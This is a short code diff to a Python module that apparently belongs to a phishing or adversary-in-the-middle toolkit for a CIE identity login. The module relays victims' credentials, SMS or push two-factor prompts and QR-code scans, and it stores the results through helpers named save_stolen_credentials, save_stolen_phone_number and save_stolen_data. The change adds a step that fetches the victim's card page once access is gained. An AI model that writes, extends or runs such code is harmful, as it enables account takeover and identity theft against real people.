@@ -1,4 +1,4 @@
-from .client import execute_access_flow, access_again_login_page, post_credentials, contact_user_phone, submit_push_2fa_sms, get_2fa_status, submit_push_2fa, get_qr_code_status, submit_scanned_qr_code, confirm_access
+from .client import execute_access_flow, access_again_login_page, post_credentials, contact_user_phone, submit_push_2fa_sms, get_2fa_status, submit_push_2fa, get_qr_code_status, submit_scanned_qr_code, confirm_access, get_card_page
 from .parser import extract_qr_code, extract_errors, extract_phone_number
 from ..flow import LoginFlow
 from ..utils.writer import save_stolen_credentials, save_stolen_phone_number, save_stolen_data
@@ -79,3 +79,7 @@ def retrieve_access_after_qr_code_scan(login_flow: LoginFlow) -> None:
     submit_scanned_qr_code(login_flow)
     confirm_access(login_flow)
     save_stolen_data(login_flow)
+
+def access_card_page(login_flow: LoginFlow) -> None:
+    """Accesses the card page for the CIE login"""
+    get_card_page(login_flow)
